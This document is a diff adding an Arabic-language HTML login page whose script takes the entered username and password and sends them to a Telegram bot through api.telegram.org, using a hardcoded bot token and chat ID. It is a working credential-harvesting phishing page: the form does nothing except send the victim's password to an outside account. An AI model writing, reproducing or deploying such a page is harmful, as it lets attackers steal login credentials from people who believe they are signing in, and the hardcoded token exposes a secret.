@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; }
+        .container { width: 300px; margin: 50px auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0px 0px 10px #ccc; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>تسجيل الدخول</h2>
+        <input type="text" id="username" placeholder="اسم المستخدم">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button onclick="sendLoginToTelegram()">تسجيل الدخول</button>
+    </div>
+
+    <script>
+        function sendLoginToTelegram() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            var botToken = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y"; // ضع رمز البوت هنا
+            var chatId = "7302541527"; // ضع معرف الشات هنا
+            var message = `🔹 تسجيل دخول 🔹\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
+
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => alert("تم إرسال بيانات تسجيل الدخول إلى تليجرام!"))
+                .catch(error => alert("حدث خطأ أثناء الإرسال."));
+        }
+    </script>
+</body>
+  </html>
